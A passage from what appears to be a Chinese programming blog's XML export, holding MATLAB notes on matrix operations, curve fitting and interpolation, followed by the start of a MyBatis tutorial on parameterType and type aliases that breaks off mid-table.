code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">triu</span>(a) <span class="hljs-comment">%提取矩阵a的主对角线及以上的元素。</span><br><span class="hljs-built_in">triu</span>(a,k) <span class="hljs-comment">%提取矩阵a的第k条对角线及以上的元素。</span><br></code></pre></div></td></tr></table></figure><h3 id="22-2-下三角矩阵"><a href="#22-2-下三角矩阵" class="headerlink" title="22.2 下三角矩阵"></a>22.2 下三角矩阵</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">tril</span>() <span class="hljs-comment">% 用法同triu函数。</span><br></code></pre></div></td></tr></table></figure><h2 id="23-矩阵的转置"><a href="#23-矩阵的转置" class="headerlink" title="23.矩阵的转置"></a>23.矩阵的转置</h2><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">转置运输符是小数点后面接单引号（.<span class="hljs-string">&#x27;）</span><br><span class="hljs-string">共轭转置，其运算符是单引号（&#x27;</span>），它在转置的基础上还要取每个数的复共轭。<br></code></pre></div></td></tr></table></figure><h2 id="24-矩阵的旋转、翻转、求逆"><a href="#24-矩阵的旋转、翻转、求逆" class="headerlink" title="24.矩阵的旋转、翻转、求逆"></a>24.矩阵的旋转、翻转、求逆</h2><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% 旋转</span><br><span class="hljs-built_in">rot90</span>(a,k) <span class="hljs-comment">% 将矩阵a逆时针方向旋转90°的k倍，k=1时可省略。</span><br><br><span class="hljs-comment">% 翻转</span><br><span class="hljs-built_in">fliplr</span>(a) <span class="hljs-comment">% 对矩阵a实施左右翻转</span><br><span class="hljs-built_in">flipud</span>(a) <span class="hljs-comment">% 对矩阵a实施上下翻转</span><br><br><span class="hljs-comment">% 求逆</span><br>inv(a) <span class="hljs-comment">% 求方阵a的逆矩阵</span><br></code></pre></div></td></tr></table></figure><h2 id="25-求矩阵元素个数（numel函数）"><a href="#25-求矩阵元素个数（numel函数）" class="headerlink" title="25.求矩阵元素个数（numel函数）"></a>25.求矩阵元素个数（numel函数）</h2><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">numel</span>(a)<br></code></pre></div></td></tr></table></figure><h2 id="26-拟合函数"><a href="#26-拟合函数" class="headerlink" title="26.拟合函数"></a>26.拟合函数</h2><h3 id="26-1-线性最小二乘拟合"><a href="#26-1-线性最小二乘拟合" class="headerlink" title="26.1 线性最小二乘拟合"></a>26.1 线性最小二乘拟合</h3><h4 id="26-1-1-多项式曲线拟合函数（polyfit函数）"><a href="#26-1-1-多项式曲线拟合函数（polyfit函数）" class="headerlink" title="26.1.1 多项式曲线拟合函数（polyfit函数）"></a>26.1.1 多项式曲线拟合函数（polyfit函数）</h4><blockquote><ol><li>方法</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">P=polyfit（X，Y，n） <br>[P,S]=polyfit（X，Y，n）<br>[P,S,mu]=polyfit（X，Y，n）<br><br><span class="hljs-comment">%n 需要小于等于样点（x，y）的个数。</span><br><span class="hljs-comment">%函数将根据采样点X和采样点的函数值Y，产生一个n次的多项式P，S为采样点的误差向量，mu（1）是%mean（X）（平均值），mu（2）是std（X）（方差）。</span><br></code></pre></div></td></tr></table></figure><h4 id="26-1-2-多项式计算求值函数（polyval函数）"><a href="#26-1-2-多项式计算求值函数（polyval函数）" class="headerlink" title="26.1.2 多项式计算求值函数（polyval函数）"></a>26.1.2 多项式计算求值函数（polyval函数）</h4><blockquote><ol><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% 求多项式p(x)=4*x^2+2*x+1在x=[5 6 7]的值</span><br>p = [<span class="hljs-number">4</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span>] <span class="hljs-comment">% 系数</span><br>x = [<span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span>] <span class="hljs-comment">% x的值</span><br>polyval(p,x)<br></code></pre></div></td></tr></table></figure><h4 id="26-1-3-工具箱（cftool函数）"><a href="#26-1-3-工具箱（cftool函数）" class="headerlink" title="26.1.3 工具箱（cftool函数）"></a>26.1.3 工具箱（cftool函数）</h4><blockquote><ol><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">cftool<br></code></pre></div></td></tr></table></figure><h3 id="26-2-非线性最小二乘拟合"><a href="#26-2-非线性最小二乘拟合" class="headerlink" title="26.2 非线性最小二乘拟合"></a>26.2 非线性最小二乘拟合</h3><h4 id="26-2-1-lsqcurvefit、lsqnonlin函数"><a href="#26-2-1-lsqcurvefit、lsqnonlin函数" class="headerlink" title="26.2.1 lsqcurvefit、lsqnonlin函数"></a>26.2.1 lsqcurvefit、lsqnonlin函数</h4><p>两个函数都需要先建立函数文件。</p><blockquote><ol><li>lsqcurvefit函数</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">x=lsqcurvefit(<span class="hljs-string">&#x27;f&#x27;</span>,a,xd,yd)<br></code></pre></div></td></tr></table></figure><ul><li><p>f：符号函数句柄。也可以是函数文件，但函数的参数需要是x和xd。即fun(x,xd)。</p></li><li><p>a：最开始预估的值（预拟合的未知参数的估计值）。</p></li><li><p>xd：已知的xd值。</p></li><li><p>yd：已知的yd值。</p></li></ul><blockquote><ol start="2"><li>lsqnonlin函数</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">x=lsqnonlin(<span class="hljs-string">&#x27;f&#x27;</span>,x0)<br><span class="hljs-comment">% f是一个函数文件，自变量为x</span><br><span class="hljs-comment">% x0 是迭代初值</span><br></code></pre></div></td></tr></table></figure><h2 id="27-利用多项式求系数、利用系数求多项式"><a href="#27-利用多项式求系数、利用系数求多项式" class="headerlink" title="27.利用多项式求系数、利用系数求多项式"></a>27.利用多项式求系数、利用系数求多项式</h2><h3 id="27-1-求多项式的系数（sym2poly函数）"><a href="#27-1-求多项式的系数（sym2poly函数）" class="headerlink" title="27.1 求多项式的系数（sym2poly函数）"></a>27.1 求多项式的系数（sym2poly函数）</h3><p>返回值是多项式的系数，依次输出由高阶到0阶的系数。</p><blockquote><ol><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">syms x; <span class="hljs-comment">% 必须先运行此代码,且这里的x为多项式的未知数x，也可以换成其他字母</span><br>sym2poly(x^<span class="hljs-number">3</span>+<span class="hljs-number">2</span>*x^<span class="hljs-number">2</span><span class="hljs-number">-4</span>*x<span class="hljs-number">-9</span>)<br></code></pre></div></td></tr></table></figure><h3 id="27-2-求多项式（poly2sym函数）"><a href="#27-2-求多项式（poly2sym函数）" class="headerlink" title="27.2 求多项式（poly2sym函数）"></a>27.2 求多项式（poly2sym函数）</h3><blockquote><ol><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">syms x; <span class="hljs-comment">% 必须先运行此代码,且这里的x为多项式的未知数x，也可以换成其他字母</span><br>poly2sym([<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>],x)<br></code></pre></div></td></tr></table></figure><h2 id="28-插值函数"><a href="#28-插值函数" class="headerlink" title="28.插值函数"></a>28.插值函数</h2><h3 id="28-1-interp1函数"><a href="#28-1-interp1函数" class="headerlink" title="28.1  interp1函数"></a>28.1  interp1函数</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">y1=interp1(x,y,x1) <span class="hljs-comment">% 默认linear分段线性插值</span><br>y1=interp1(x,y,x1,<span class="hljs-string">&#x27;nearest&#x27;</span>) <span class="hljs-comment">% 临近插值</span><br>y1=interp1(x,y,x1,<span class="hljs-string">&#x27;spline&#x27;</span>) <span class="hljs-comment">% 球面线性插值、样条插值</span><br>y1=interp1(x,y,x1,<span class="hljs-string">&#x27;cubic&#x27;</span>) <span class="hljs-comment">% 三次多项式插值</span><br>y1=interp1(x,y,x1,<span class="hljs-string">&#x27;pchip&#x27;</span>) <span class="hljs-comment">% 分段三次Hermite 插值</span><br><br><span class="hljs-comment">% 其中x，y为插值点，yi为在被插值点xi处的插值结果；x,y为向量，   </span><br><span class="hljs-comment">% &#x27;method&#x27;表示采用的插值方法，MATLAB提供的插值方法有几种：&#x27;nearest&#x27;是最邻近插值， &#x27;linear&#x27;线性插值； &#x27;spline&#x27;三次样条插值； &#x27;pchip&#x27;立方插值．缺省时表示线性插值  </span><br><span class="hljs-comment">% 注意：所有的插值方法都要求x是单调的，并且xi不能够超过x的范围。  </span><br></code></pre></div></td></tr></table></figure><h3 id="28-2-拉格朗日插值"><a href="#28-2-拉格朗日插值" class="headerlink" title="28.2 拉格朗日插值"></a>28.2 拉格朗日插值</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">y</span>=<span class="hljs-title">lagrange</span><span class="hljs-params">(x0,y0,x)</span> </span><br><span class="hljs-comment">%拉格朗日插值函数 </span><br><span class="hljs-comment">%n 个节点数据以数组 x0, y0 输入(注意 Matlat 的数组下标从1开始), </span><br><span class="hljs-comment">%m 个插值点以数组 x 输入,输出数组 y 为 m 个插值 </span><br>n=<span class="hljs-built_in">length</span>(x0);m=<span class="hljs-built_in">length</span>(x); <br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:m <br>z=x(<span class="hljs-built_in">i</span>); <br>s=<span class="hljs-number">0.0</span>; <br><span class="hljs-keyword">for</span> k=<span class="hljs-number">1</span>:n <br>      p=<span class="hljs-number">1.0</span>; <br>      <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span>=<span class="hljs-number">1</span>:n <br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">j</span>~=k <br>              p=p*(z-x0(<span class="hljs-built_in">j</span>))/(x0(k)-x0(<span class="hljs-built_in">j</span>)); <br>           <span class="hljs-keyword">end</span> <br>      <span class="hljs-keyword">end</span> <br>      s=p*y0(k)+s; <br><span class="hljs-keyword">end</span> <br>y(<span class="hljs-built_in">i</span>)=s; <br><span class="hljs-keyword">end</span><br></code></pre></div></td></tr></table></figure><h3 id="28-3-埃尔米特插值"><a href="#28-3-埃尔米特插值" class="headerlink" title="28.3 埃尔米特插值"></a>28.3 埃尔米特插值</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">y</span> = <span class="hljs-title">hermite</span><span class="hljs-params">( x0,y0,y1,x )</span> </span><br><span class="hljs-comment">%埃尔米特插值多项式 </span><br><span class="hljs-comment">%x0为点横坐标 </span><br><span class="hljs-comment">%y0为函数值 </span><br><span class="hljs-comment">%y1为导数值 </span><br><span class="hljs-comment">%m个插值点用数组x输入 </span><br>n=<span class="hljs-built_in">length</span>(x0);m=<span class="hljs-built_in">length</span>(x); <br><span class="hljs-keyword">for</span> k=<span class="hljs-number">1</span>:m <br>    yy=<span class="hljs-number">0.0</span>; <br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:n <br>     h=<span class="hljs-number">1.0</span>; <br>     a=<span class="hljs-number">0.0</span>; <br>      <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span>=<span class="hljs-number">1</span>:n <br>         <span class="hljs-keyword">if</span> <span class="hljs-built_in">j</span>~=<span class="hljs-built_in">i</span> <br>           h=h*((x(k)-x0(<span class="hljs-built_in">j</span>))/(x0(<span class="hljs-built_in">i</span>)-x0(<span class="hljs-built_in">j</span>)))^<span class="hljs-number">2</span>; <br>           a=<span class="hljs-number">1</span>/(x0(<span class="hljs-built_in">i</span>)-x0(<span class="hljs-built_in">j</span>))+a; <br>         <span class="hljs-keyword">end</span> <br>      <span class="hljs-keyword">end</span> <br>      yy=yy+h*((x0(<span class="hljs-built_in">i</span>)-x(k))*(<span class="hljs-number">2</span>*a*y0(<span class="hljs-built_in">i</span>)-y1(<span class="hljs-built_in">i</span>))+y0(<span class="hljs-built_in">i</span>)); <br><span class="hljs-keyword">end</span> <br>y(k)=yy; <br><span class="hljs-keyword">end</span><br></code></pre></div></td></tr></table></figure><h3 id="28-4-二维插值之插值节点为散乱节点"><a href="#28-4-二维插值之插值节点为散乱节点" class="headerlink" title="28.4 二维插值之插值节点为散乱节点"></a>28.4 二维插值之插值节点为散乱节点</h3><blockquote><ol><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">ZI = griddata(X,Y,Z,XI,YI,<span class="hljs-string">&#x27;method&#x27;</span>)<br><span class="hljs-comment">%其中 X、 Y、 Z 均为 n 维向量，指明所给数据点的横坐标、纵坐标和竖坐标。向量 XI、YI 是给定的网格点的横坐标和纵坐标，返回值 ZI 为网格（ XI， YI）处的函数值。 XI与 YI 应是方向不同的向量，即一个是行向量，另一个是列向量。</span><br><br><span class="hljs-comment">% 插值方法：nearest（最邻近插值）、linear（双线性插值）、cubic（双三次插值）、v4（Matlab提供的插值方法）。</span><br></code></pre></div></td></tr></table></figure><h2 id="29-获得每两个点之间的距离（pdist函数）"><a href="#29-获得每两个点之间的距离（pdist函数）" class="headerlink" title="29.获得每两个点之间的距离（pdist函数）"></a>29.获得每两个点之间的距离（pdist函数）</h2><h3 id="29-1-求距离（pdist函数）"><a href="#29-1-求距离（pdist函数）" class="headerlink" title="29.1 求距离（pdist函数）"></a>29.1 求距离（pdist函数）</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% 一个矩阵X的大小为M*N，</span><br>D = pdist(X) <br><span class="hljs-comment">% 得到的矩阵D的大小为1行M*(M-1)/2列，表示的意义是M行数据，每两行计算一下距离。</span><br>D = pdist(X,<span class="hljs-string">&#x27;distance&#x27;</span>)<br><span class="hljs-comment">% distance 表示用什么距离方式。默认欧式距离</span><br></code></pre></div></td></tr></table></figure><ul><li>distance 参数：<br>欧几里德距离（euclidean）、标准欧几里德距离（seuclidean）、马哈拉诺比斯距离（mahalanobis）、曼哈顿距离(城市区块距离)（cityblock）、闵可夫斯基距离（minkowski）、切比雪夫距离（chebychev）、夹角余弦距离（cosine）、相关距离（correlation）、汉明距离（hamming）、杰卡德距离（jaccard）、斯皮尔曼（spearman）、</li></ul><h3 id="29-2-将向量转化为矩阵"><a href="#29-2-将向量转化为矩阵" class="headerlink" title="29.2 将向量转化为矩阵"></a>29.2 将向量转化为矩阵</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">squareform(dis) <span class="hljs-comment">% 将向量 dis 转化为矩阵</span><br><br><span class="hljs-comment">% 实例</span><br>A = [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>;<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>;<span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span>;<span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>];<br>dis = pdist(A);<span class="hljs-comment">%计算各行向量之间的欧式距离</span><br>squareform(dis)<span class="hljs-comment">%将向量 dis 转化为矩阵</span><br><span class="hljs-comment">% 矩阵中i行 j列元素表示 A中第i个行向量，与第j个行向量之间的欧氏距离。</span><br></code></pre></div></td></tr></table></figure><h2 id="30-矩阵求值"><a href="#30-矩阵求值" class="headerlink" title="30.矩阵求值"></a>30.矩阵求值</h2><h3 id="30-1-矩阵的行列式"><a href="#30-1-矩阵的行列式" class="headerlink" title="30.1 矩阵的行列式"></a>30.1 矩阵的行列式</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">det(a) <span class="hljs-comment">% 求方阵a所对应的行列式的值</span><br></code></pre></div></td></tr></table></figure><h3 id="30-2-矩阵的秩"><a href="#30-2-矩阵的秩" class="headerlink" title="30.2 矩阵的秩"></a>30.2 矩阵的秩</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">rank(a) <span class="hljs-comment">% 求矩阵a的秩</span><br></code></pre></div></td></tr></table></figure><h3 id="30-3-矩阵的迹"><a href="#30-3-矩阵的迹" class="headerlink" title="30.3 矩阵的迹"></a>30.3 矩阵的迹</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">trace(a) <span class="hljs-comment">% 求矩阵a的迹</span><br></code></pre></div></td></tr></table></figure><h3 id="30-4-向量和矩阵的范数"><a href="#30-4-向量和矩阵的范数" class="headerlink" title="30.4 向量和矩阵的范数"></a>30.4 向量和矩阵的范数</h3><p>矩阵或向量的范数用来度量矩阵或向量在某种意义下的长度。</p><blockquote><ol><li>向量的三种常用范数</li></ol></blockquote><ul><li><p>向量1-范数：向量元素的绝对值之和。</p></li><li><p>向量2-范数：向量元素绝对值的平方和的平方根。</p></li><li><p>向量∞-范数：所有向量元素绝对值中的最大值。</p></li></ul><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">norm(v)或norm(v,<span class="hljs-number">2</span>) <span class="hljs-comment">% 计算向量v的2-范数。</span><br>norm(v,<span class="hljs-number">1</span>) <span class="hljs-comment">% 计算向量v的1-范数。</span><br>norm(v,<span class="hljs-built_in">inf</span>) <span class="hljs-comment">% 计算向量v的∞-范数。</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>矩阵的三种常用范数</li></ol></blockquote><ul><li><p>矩阵a的1-范数：矩阵列元素绝对值之和的最大值。</p></li><li><p>矩阵a的2-范数：a’a矩阵的最大特征值的平方根。</p></li><li><p>矩阵a的∞-范数：所有矩阵行元素绝对值之和的最大值。</p></li></ul><p><strong>用法与向量的范数的函数完全相同。</strong></p><h3 id="30-5-矩阵的条件数"><a href="#30-5-矩阵的条件数" class="headerlink" title="30.5 矩阵的条件数"></a>30.5 矩阵的条件数</h3><ul><li><p>矩阵a的条件数等于a的范数与a的逆矩阵的范数的乘积。</p></li><li><p>条件数越接近于1，矩阵的性能越好，反之，矩阵的性能越差。</p></li></ul><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">cond(a,<span class="hljs-number">1</span>) <span class="hljs-comment">% 计算a的1-范数下的条件数。</span><br>cond(a)或cond(a,<span class="hljs-number">2</span>) <span class="hljs-comment">% 计算a的2-范数下的条件数。</span><br>cond(a,<span class="hljs-built_in">inf</span>) <span class="hljs-comment">% 计算a的∞-范数下的条件数。</span><br></code></pre></div></td></tr></table></figure><h3 id="30-6-矩阵的特征值与特征向量"><a href="#30-6-矩阵的特征值与特征向量" class="headerlink" title="30.6 矩阵的特征值与特征向量"></a>30.6 矩阵的特征值与特征向量</h3><p>设a是n阶方阵，如果存在常熟λ和n维非零列向量x，使得等式ax=λx成立，则称λ为a的特征值，x是对应特征值λ的特征向量。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">e=eig(a) <span class="hljs-comment">% 求矩阵a的全部特征值，构成向量e</span><br>[x,d]=eig(a) <span class="hljs-comment">% 求矩阵a的全部特征值，构成对角阵d，并产生矩阵x，x各列是相应的特征向量。</span><br><br>可以用 eigshow函数 演示单位圆上的关系。<br></code></pre></div></td></tr></table></figure><h2 id="31-稀疏矩阵"><a href="#31-稀疏矩阵" class="headerlink" title="31.稀疏矩阵"></a>31.稀疏矩阵</h2><h3 id="31-1-存储方式"><a href="#31-1-存储方式" class="headerlink" title="31.1 存储方式"></a>31.1 存储方式</h3><h4 id="31-1-1-完全存储方式"><a href="#31-1-1-完全存储方式" class="headerlink" title="31.1.1 完全存储方式"></a>31.1.1 完全存储方式</h4><h4 id="31-1-2-稀疏存储方式"><a href="#31-1-2-稀疏存储方式" class="headerlink" title="31.1.2 稀疏存储方式"></a>31.1.2 稀疏存储方式</h4><h3 id="31-2-稀疏存储方式的产生"><a href="#31-2-稀疏存储方式的产生" class="headerlink" title="31.2 稀疏存储方式的产生"></a>31.2 稀疏存储方式的产生</h3>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MyBatis学习-（三）参数</title>
    <link href="/2021/06/15/MyBatis%E5%AD%A6%E4%B9%A0/MyBatis%E5%AD%A6%E4%B9%A0-%EF%BC%88%E4%B8%89%EF%BC%89%E4%BC%A0%E5%85%A5%E5%8F%82%E6%95%B0/"/>
    <url>/2021/06/15/MyBatis%E5%AD%A6%E4%B9%A0/MyBatis%E5%AD%A6%E4%B9%A0-%EF%BC%88%E4%B8%89%EF%BC%89%E4%BC%A0%E5%85%A5%E5%8F%82%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>MyBatis 中文文档：<a href="https://mybatis.org/mybatis-3/zh/index.html">https://mybatis.org/mybatis-3/zh/index.html</a></p><p>从 java 代码中把数据传入到 mapper 文件的 SQL 语句中。</p><h2 id="1-parameterType"><a href="#1-parameterType" class="headerlink" title="1. parameterType"></a>1. parameterType</h2><p>是写在 mapper 文件中的一个属性。表示 dao 接口中方法的参数的数据类型。</p><p>示例：<br>在 StudentDao 接口中</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Student <span class="hljs-title">selectStudentById</span><span class="hljs-params">(Integer id)</span></span>;<br></code></pre></div></td></tr></table></figure><p>在 StudentDao.xml 配置文件中</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectStudentById&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;java.lang.Integer&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.loong.test.USER&quot;</span>&gt;</span><br>        select * from test where id =#&#123;id&#125;;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>其中，parameterType 是可以省略的。<br><code>parameterType</code>：是 dao 接口中方法参数的数据类型。它的值是 java 的数据类型全限定名称（java.lang.Integer），或者是 mybatis 定义的别名。parameterType 不说强制的，mybatis 通过反射机制能够发现接口参数的类型。所以可以不写，但一般也不写。</p><p>MyBatis 定义的别名表：</p><blockquote><ol><li><code>基本类型</code></li></ol></blockquote><table><thead><tr><th align="center">类型</th><th align="center">别名</th></tr></thead><tbody><tr><td align="center"><code>int</code></td><td align="center"><code>_int</code></td></tr><tr><td align="center"><code>int</code></td><td align="center"><code>_integer</code></td></tr><tr><td align="center"><code>short</code></td><td align="center"><code>_short</code></td></tr><tr><td align="center"><code>double</code></td><td align="center"><code>_double</code></td></tr><tr><td align="center"><code>byte</code></td><td align="center"><code>_byte</code></td></tr><tr><td align="center"><code>long</code></td><td align="center"><code>_long</code></td></tr><tr><td align="center"><code>float</code></td><td align="center"><code>_float</code></td></tr><tr><td align="center"><code>boolean</code></td><td align="center"><code>_boolean</code></td></tr></tbody></table><blockquote><ol start="2"><li><code>包装类型</code></li></ol></blockquote><table><thead><tr><th align="center">类型</th><th align="center">别名</th></tr></thead><tbody><tr><td align="center"><code>String</code></td><td align="center"><code>string</code></td></tr><tr><td align="center"><code>Long</code></td><td align="center"><code>long</code></td></tr><tr><td align="center"><code>Integer</code></td><td align="center"><code>int</code></td></tr><tr><td align="center"><code>Integer</code></td><td align="center"><code>integer</code></td></tr><tr><td align="center"><code>Double</code></td><td align="center"><code>double</code></td></tr><tr><td align="center"><code>Boolean</code></td><td align="center"><code>boolean</code></td></tr><tr><td align="center"><code>Object</code></td><td align="center"><code>object</code></td></tr><tr><td align="center"><code>List</code></td><td align="center"><code>list</code></td></tr><tr><td align="center"><code>Map</code></td><td align="center"><code>map</code></td></tr><tr><td align="center"><code>Iterator</code></td><td align="center"><code>iterator</code></td></tr><tr><td align="center"><code>Byte</code></td><td align="center"><code>byte</code></td></tr><tr><td align="center"><code>Short</code></td><td align="center"><code>short</code></td></tr><tr><td align="center"><code>Float</code></td><td align="center"><code>float</code></td></tr><tr><td align="center"><code>Date</code></td><td align="center"><code>date</code></td></tr><tr><td align="center"><code>Collection</code></td><td align="center"><code>collection</code></td></tr><tr><td align="center"><code>ArrayList</code></td><td align="center"><code>arraylist</code></td></tr><tr><td align="center"><code>HashMap</code></td><td 